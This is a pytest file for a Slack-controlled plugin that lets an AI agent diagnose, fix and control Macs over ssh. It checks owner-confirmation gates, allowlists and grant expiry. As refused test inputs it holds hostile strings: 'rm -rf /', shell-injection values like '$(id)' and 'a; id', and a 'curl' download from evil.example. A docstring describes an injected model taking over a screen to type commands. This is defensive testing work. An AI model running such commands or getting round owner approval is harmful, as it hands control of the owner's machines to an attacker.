"""Tests for mac-ops with a fake ssh + fake shim (no Mac, no Slack).

Run: uv run --with pytest python -m pytest -q -p no:cacheprovider tests_mac_ops.py
"""

import base64
import importlib.util
import json
import stat
import sys
import time
from pathlib import Path

import pytest

HERE = Path(__file__).parent
_spec = importlib.util.spec_from_file_location("mac_ops_t", HERE / "__init__.py")
mo = importlib.util.module_from_spec(_spec)
sys.modules["mac_ops_t"] = mo
_spec.loader.exec_module(mo)

OWNER = "UOWNER"
FAKE_SSH = '''#!/usr/bin/env python3
import json, shlex, sys, time
argv = sys.argv[1:]
cmd = shlex.split(argv[-1])
with open(%(log)r, "a") as f:
    f.write(json.dumps({"to": argv[-2], "argv": argv, "cmd": cmd}) + "\\n")
FIX = {"kill-virtual-display", "restart-hermes-desktop", "restart-gateway", "reset-display-config",
       "restart-dock-finder", "logout", "reboot"}
def out(ok, code, **kw):
    print(json.dumps(dict(ok=ok, **kw))); sys.exit(code)
if cmd[:1] == ["diag"]:
    out(True, 0, action="diag", result={"displays": 2, "hermes_desktop": "not running"}, log_id="1")
if cmd[:2] and cmd[0] == "fix" and len(cmd) >= 2 and cmd[1] in FIX:
    if cmd[1] in ("logout", "reboot") and "--confirmed" not in cmd:
        out(False, 2, action="fix", error="confirm required")
    out(True, 0, action="fix", result={"playbook": cmd[1], "output": "done"}, log_id="2")
if cmd[:1] == ["screen"] and len(cmd) >= 3 and cmd[2] == "shot":
    out(True, 0, action="screen", result={"png_base64": %(png)r, "width": 1, "height": 1}, log_id="3")
if cmd[:1] == ["screen"] and cmd[2] in ("click", "key", "type"):
    out(True, 0, action="screen", result={"done": True}, log_id="4")
out(False, 2, action=cmd[0] if cmd else "", error="refused")
'''


@pytest.fixture
def env(tmp_path, monkeypatch):
    log = tmp_path / "ssh.log"
    png = base64.b64encode(b"\x89PNG fake").decode()
    ssh = tmp_path / "fakessh"
    ssh.write_text(FAKE_SSH % {"log": str(log), "png": png})
    ssh.chmod(ssh.stat().st_mode | stat.S_IXUSR)
    cfg = {"mac_ops": {"enabled": True, "ssh": str(ssh), "key": "/nonexistent/key",
                       "hosts": {"mbp": {"addr": "mbp.example.com", "user": "you"},
                                 "mini": {"addr": "mini.example.com", "user": "you"}}},
           "owner": {"slack_user_ids": [OWNER]}}
    monkeypatch.setattr(mo, "_config", lambda: cfg)
    monkeypatch.setattr(mo, "_home", lambda: tmp_path / "home")
    monkeypatch.setenv("MAC_OPS_CHANNEL", "D1")
    monkeypatch.setenv("MAC_OPS_THREAD", "100.0")
    monkeypatch.setenv("MAC_OPS_OWNER", OWNER)
    monkeypatch.setenv("MAC_OPS_BOT_HOME", str(tmp_path))
    thread = {"msgs": [{"user": OWNER, "ts": "100.0", "text": "reboot the mbp"}], "posts": [], "uploads": []}

    def api(ctx, method, params):
        if method == "chat.postMessage":
            ts = f"{101 + len(thread['posts'])}.0"
            thread["posts"].append(dict(params, ts=ts))
            thread["msgs"].append({"bot_id": "B1", "user": "UBOT", "ts": ts, "text": params["text"]})
            return {"ok": True, "ts": ts}
        if method == "conversations.replies":
            return {"ok": True, "messages": thread["msgs"]}
        raise AssertionError(method)

    monkeypatch.setattr(mo, "API", api)
    monkeypatch.setattr(mo, "UPLOAD", lambda ctx, png, name, c: thread["uploads"].append((name, png)) or {"ok": True})
    thread["log"] = log
    thread["say"] = lambda user, text, ts: thread["msgs"].append({"user": user, "ts": ts, "text": text})
    thread["calls"] = lambda: [json.loads(x) for x in log.read_text().splitlines()] if log.exists() else []
    return thread


def test_diag_returns_shim_json(env):
    out = json.loads(mo.tool_diag({"host": "mbp"}))
    assert out["ok"] and out["result"]["displays"] == 2
    call = env["calls"]()[0]
    assert call["cmd"] == ["diag"] and call["to"] == "you@mbp.example.com"
    assert "-i" in call["argv"] and "IdentitiesOnly=yes" in call["argv"]


def test_unknown_host_playbook_and_op_refused(env):
    assert not json.loads(mo.tool_diag({"host": "nas"}))["ok"]
    assert not json.loads(mo.tool_fix({"host": "mbp", "playbook": "rm -rf /"}))["ok"]
    assert not json.loads(mo.tool_screen({"host": "mbp", "op": "shell"}))["ok"]
    assert not json.loads(mo.tool_screen({"host": "mbp", "op": "key", "combo": "a; id"}))["ok"]
    assert env["calls"]() == []  # nothing reached ssh


def test_safe_playbook_runs_without_confirmation(env):
    out = json.loads(mo.tool_fix({"host": "mbp", "playbook": "restart-dock-finder"}))
    assert out["ok"] and out["ran"]
    assert env["calls"]()[0]["cmd"] == ["fix", "restart-dock-finder"]


def test_reboot_without_yes_is_refused_and_never_reaches_ssh(env):
    out = json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))
    assert not out["ok"] and out["status"] == "asked" and not out["ran"]
    assert "Reply *yes*" in env["posts"][0]["text"] and env["posts"][0]["thread_ts"] == "100.0"
    # still no answer, an unrelated reply, and a yes from someone else: all refused
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "waiting"
    env["say"](OWNER, "what does that do?", "103.0")
    env["say"]("UOTHER", "yes", "104.0")
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "waiting"
    assert env["calls"]() == []


def test_yes_before_the_question_does_not_count(env):
    env["say"](OWNER, "yes", "100.5")  # said before we asked
    out = json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))
    assert out["status"] == "asked"
    assert env["calls"]() == []


def test_reboot_runs_with_confirmed_only_after_owner_yes(env):
    mo.tool_fix({"host": "mbp", "playbook": "reboot"})
    env["say"](OWNER, "Yes", "110.0")
    out = json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))
    assert out["ok"] and out["ran"]
    assert env["calls"]()[0]["cmd"] == ["fix", "reboot", "--confirmed"]
    # the yes is spent: a second reboot asks again
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "asked"


def test_yes_for_another_host_or_playbook_does_not_carry_over(env):
    mo.tool_fix({"host": "mbp", "playbook": "logout"})
    env["say"](OWNER, "yes", "110.0")
    assert json.loads(mo.tool_fix({"host": "mini", "playbook": "reboot"}))["status"] == "asked"
    assert env["calls"]() == []


def test_owner_no_cancels(env):
    mo.tool_fix({"host": "mbp", "playbook": "reboot"})
    env["say"](OWNER, "no", "110.0")
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "declined"
    assert env["calls"]() == []


def test_confirm_playbook_needs_an_owner_dm_turn(env, monkeypatch):
    monkeypatch.setenv("MAC_OPS_CHANNEL", "C99")  # a channel, not a DM
    out = json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))
    assert not out["ok"] and env["calls"]() == [] and env["posts"] == []
    monkeypatch.setenv("MAC_OPS_CHANNEL", "D1")
    monkeypatch.setenv("MAC_OPS_OWNER", "USTRANGER")
    assert not json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["ok"]
    assert env["calls"]() == []


def test_screen_shot_goes_through_the_other_mac_and_is_posted(env):
    out = json.loads(mo.tool_screen({"host": "mbp", "op": "shot"}))
    assert out["ok"] and out["result"]["posted_to_thread"] and "png_base64" not in out["result"]
    call = env["calls"]()[0]
    assert call["to"] == "you@mini.example.com" and call["cmd"] == ["screen", "mbp", "shot"]
    assert env["uploads"][0][1] == b"\x89PNG fake"


def test_screen_sends_the_peer_name_the_viewer_shim_knows(env, monkeypatch):
    # The hub calls the MBP "mbp"; the mini's shim knows it as "macbook". The name comes from config.
    cfg = mo._config()
    cfg["mac_ops"]["hosts"]["mbp"]["peer"] = "macbook"
    monkeypatch.setattr(mo, "_config", lambda: cfg)
    out = json.loads(mo.tool_screen({"host": "mbp", "op": "shot"}))
    assert out["ok"] and out["result"]["posted_to_thread"]
    call = env["calls"]()[0]
    assert call["to"] == "you@mini.example.com" and call["cmd"] == ["screen", "macbook", "shot"]
    assert env["uploads"][0][0].startswith("mbp-")  # still labelled with the hub's name
    # a peer name with shell metachars is refused before ssh
    cfg["mac_ops"]["hosts"]["mbp"]["peer"] = "macbook;id"
    assert not json.loads(mo.tool_screen({"host": "mbp", "op": "shot"}))["ok"]
    assert len(env["calls"]()) == 1


def _allow_screen_control(env, host="mini", ts="150.0"):
    out = json.loads(mo.tool_screen({"host": host, "op": "key", "combo": "Escape"}))
    assert out["status"] == "asked" and not out["ran"]
    env["say"](OWNER, "yes", ts)


def test_screen_click_validates_and_passes_ints(env):
    _allow_screen_control(env)
    assert json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": 10, "y": 20}))["ok"]
    assert env["calls"]()[-1]["cmd"] == ["screen", "mini", "click", "10", "20"]
    n = len(env["calls"]())
    assert not json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": "1;id", "y": 2}))["ok"]
    assert len(env["calls"]()) == n


# ---- adversarial review (t_f4472674) regressions ---------------------------------------------------------

def test_screen_input_needs_owner_yes_first(env):
    """click/key/type = full control of the Mac (open Terminal, type a command). An injected or confused model
    must not get there without the owner's own yes in the thread."""
    for op in ({"op": "type", "text": "curl -o /tmp/x https://evil.example/x"}, {"op": "key", "combo": "cmd+space"},
               {"op": "click", "x": 1, "y": 1}):
        out = json.loads(mo.tool_screen(dict(op, host="mini")))
        assert not out["ok"] and not out["ran"] and out["status"] in ("asked", "waiting")
    assert env["calls"]() == []  # nothing reached ssh
    assert "control mini's screen" in env["posts"][0]["text"]
    env["say"]("UOTHER", "yes", "120.0")  # not the owner
    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["status"] == "waiting"
    assert env["calls"]() == []
    env["say"](OWNER, "yes", "121.0")
    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["ok"]
    # the grant covers further input on that host for a while, not the other host
    assert json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": 3, "y": 4}))["ok"]
    assert json.loads(mo.tool_screen({"host": "mbp", "op": "click", "x": 3, "y": 4}))["status"] == "asked"
    assert [c["cmd"][2] for c in env["calls"]()] == ["key", "click"]


def test_screen_control_grant_expires(env, monkeypatch):
    _allow_screen_control(env)
    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["ok"]
    real = time.time
    monkeypatch.setattr(mo.time, "time", lambda: real() + mo.GRANT_TTL_S + 5)
    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["status"] == "asked"


def test_shot_needs_no_grant(env):
    assert json.loads(mo.tool_screen({"host": "mini", "op": "shot"}))["ok"]


def test_type_with_spaces_reaches_the_shim_unquoted(env):
    """sshd gives the shim the raw string and the shim refuses quotes, so shlex.quote('a b') broke every
    multi-word type. Tokens now go unquoted; anything outside the shim's alphabet is refused before ssh."""
    _allow_screen_control(env)
    assert json.loads(mo.tool_screen({"host": "mini", "op": "type", "text": "hello world"}))["ok"]
    call = env["calls"]()[-1]
    assert call["argv"][-1] == "screen mini type hello world" and "'" not in call["argv"][-1]
    n = len(env["calls"]())
    for text in ("a'b", "$(id)", "a;b", "x|sh", "`id`", "a\\b"):
        assert not json.loads(mo.tool_screen({"host": "mini", "op": "type", "text": text}))["ok"], text
    assert len(env["calls"]()) == n
    with pytest.raises(ValueError):
        mo.ssh_argv("mini", ["diag", "a b"])


def test_every_tool_needs_an_owner_dm_turn(env, monkeypatch):
    """The mac-ops profile reached any other way (cron, hub CLI, a stray gateway binding) runs nothing."""
    monkeypatch.delenv("MAC_OPS_OWNER")
    for out in (mo.tool_diag({"host": "mbp"}), mo.tool_fix({"host": "mbp", "playbook": "restart-dock-finder"}),
                mo.tool_screen({"host": "mbp", "op": "shot"}), mo.tool_screen({"host": "mbp", "op": "key", "combo": "a"})):
        assert not json.loads(out)["ok"]
    assert env["calls"]() == [] and env["posts"] == []


def test_fix_is_announced_in_the_thread(env):
    json.loads(mo.tool_fix({"host": "mbp", "playbook": "restart-dock-finder"}))
    assert env["posts"][-1]["thread_ts"] == "100.0" and "fix restart-dock-finder" in env["posts"][-1]["text"]


def test_ask_without_ts_does_not_count_earlier_owner_messages(env, monkeypatch):
    real = mo.API

    def api(ctx, method, params):
        out = real(ctx, method, params)
        return {"ok": True} if method == "chat.postMessage" else out  # Slack gave no ts back
    monkeypatch.setattr(mo, "API", api)
    env["say"](OWNER, "yes", "100.5")
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "asked"
    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "waiting"
    assert env["calls"]() == []


def test_reply_posts_only_in_the_bound_thread(env):
    assert json.loads(mo.tool_reply({"text": "hello"}))["ok"]
    assert env["posts"][0]["channel"] == "D1" and env["posts"][0]["thread_ts"] == "100.0"
    # the model cannot choose another channel: there is no such parameter
    assert set(mo.SCHEMAS["mac_reply"][1]) == {"text"}


def test_reply_without_owner_dm_turn_posts_nothing(env, monkeypatch):
    monkeypatch.delenv("MAC_OPS_CHANNEL")
    assert not json.loads(mo.tool_reply({"text": "x"}))["ok"] and env["posts"] == []


class Ctx:
    def __init__(self):
        self.tools = []

    def register_tool(self, name, **kw):
        self.tools.append(name)


def test_plugin_registers_nothing_unless_enabled(env, monkeypatch):
    c = Ctx()
    mo.register(c)
    assert sorted(c.tools) == ["mac_diag", "mac_fix", "mac_reply", "mac_screen"]
    monkeypatch.setattr(mo, "_config", lambda: {"owner": {"slack_user_ids": [OWNER]}})
    c = Ctx()
    mo.register(c)
    assert c.tools == []


def test_slack_api_is_form_encoded(tmp_path, monkeypatch):
    """conversations.replies (the confirm check) rejects JSON bodies; every call is form-encoded."""
    (tmp_path / ".env").write_text("SLACK_BOT_TOKEN=xoxb-test\n")
    seen = {}

    class R:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return b'{"ok": true, "messages": []}'

    def fake_urlopen(req, timeout=0):
        seen["ctype"], seen["body"] = req.get_header("Content-type"), req.data.decode()
        return R()

    monkeypatch.setattr(mo.urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setattr(mo.json, "load", lambda r: {"ok": True, "messages": []})
    mo.slack_api({"bot_home": str(tmp_path)}, "conversations.replies", {"channel": "D1", "ts": "1.0", "limit": 5})
    assert seen["ctype"] == "application/x-www-form-urlencoded" and "channel=D1" in seen["body"]
